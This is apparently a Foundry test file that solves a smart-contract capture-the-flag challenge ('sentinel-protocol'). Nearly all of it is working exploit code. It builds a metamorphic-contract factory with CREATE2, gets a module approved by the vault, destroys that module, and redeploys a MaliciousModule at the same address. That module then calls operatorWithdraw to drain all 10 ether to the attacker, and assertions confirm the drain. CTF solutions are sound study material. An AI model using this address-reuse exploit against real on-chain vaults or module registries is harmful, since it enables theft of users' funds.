// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

import {Challenge} from "src/sentinel-protocol/Challenge.sol";
import {EchoModule} from "src/sentinel-protocol/EchoModule.sol";
import {SentinelVault} from "src/sentinel-protocol/SentinelVault.sol";

contract solve is Test {
    address DEPLOYER;
    address ATTACKER;

    Challenge internal challenge;
    SentinelVault internal vault;
    MetamorphicFactory internal factory;

    bytes32 internal constant SALT = keccak256("approved-module");
    address internal module;

    function setUp() public {
        DEPLOYER = makeAddr("deployer");
        ATTACKER = makeAddr("attacker");

        vm.deal(DEPLOYER, 10 ether);

        vm.startPrank(DEPLOYER);
        EchoModule echoModuleRef = new EchoModule();
        challenge = new Challenge{value: 10 ether}(address(echoModuleRef));
        vm.stopPrank();

        vault = challenge.VAULT();
        factory = new MetamorphicFactory();

        factory.setImplementation(address(new EchoModule()));
        // this module is MetamorphicModule
        module = factory.deploy(SALT);

        vm.prank(ATTACKER);
        vault.registerModule(module);

        // `setUp()` and `testSolve()` are separate top-level calls in Forge.
        // Destroy the approved module here so the address can be recycled in the test.
        vm.prank(ATTACKER);
        EchoModule(module).decommission();
    }

    function testSolve() public {
        factory.setImplementation(address(new MaliciousModule()));

        address redeployed = factory.deploy(SALT);
        assertEq(redeployed, module);

        vm.prank(ATTACKER);
        MaliciousModule(redeployed).drain(address(vault), payable(ATTACKER));

        assertTrue(challenge.isSolved());
        assertEq(address(vault).balance, 0);
        assertEq(ATTACKER.balance, 10 ether);
    }
}

contract MaliciousModule {
    function drain(address _vault, address payable _recipient) external {
        SentinelVault vault = SentinelVault(payable(_vault));
        vault.operatorWithdraw(_recipient, address(vault).balance);
    }
}

contract MetamorphicFactory {
    address public implementation;

    function setImplementation(address _implementation) external {
        implementation = _implementation;
    }

    function deploy(bytes32 _salt) external returns (address deployed) {
        // generate the creation code of Metamorphic contract
        bytes memory initCode = abi.encodePacked(type(Metamorphic).creationCode, abi.encode(address(this)));

        assembly {
            //create2(value, memory_ptr, size, salt)
            //[ length (0x20 bytes) ][ data ... ]
            // Same salt + same code -> fixed address
            deployed := create2(0, add(initCode, 0x20), mload(initCode), _salt)
        }

        require(deployed != address(0), "deploy failed");
    }

    function getAddress(bytes32 _salt) external view returns (address predicted) {
        bytes memory initCode = abi.encodePacked(type(Metamorphic).creationCode, abi.encode(address(this)));
        bytes32 initCodeHash = keccak256(initCode);

        // the same logic of create2
        predicted =
            address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, initCodeHash)))));
    }
}

contract Metamorphic {
    constructor(address _factory) payable {
        address implementation = MetamorphicFactory(_factory).implementation();

        assembly {
            let size := extcodesize(implementation)
            extcodecopy(implementation, 0, 0, size)
            return(0, size)
        }
    }
}
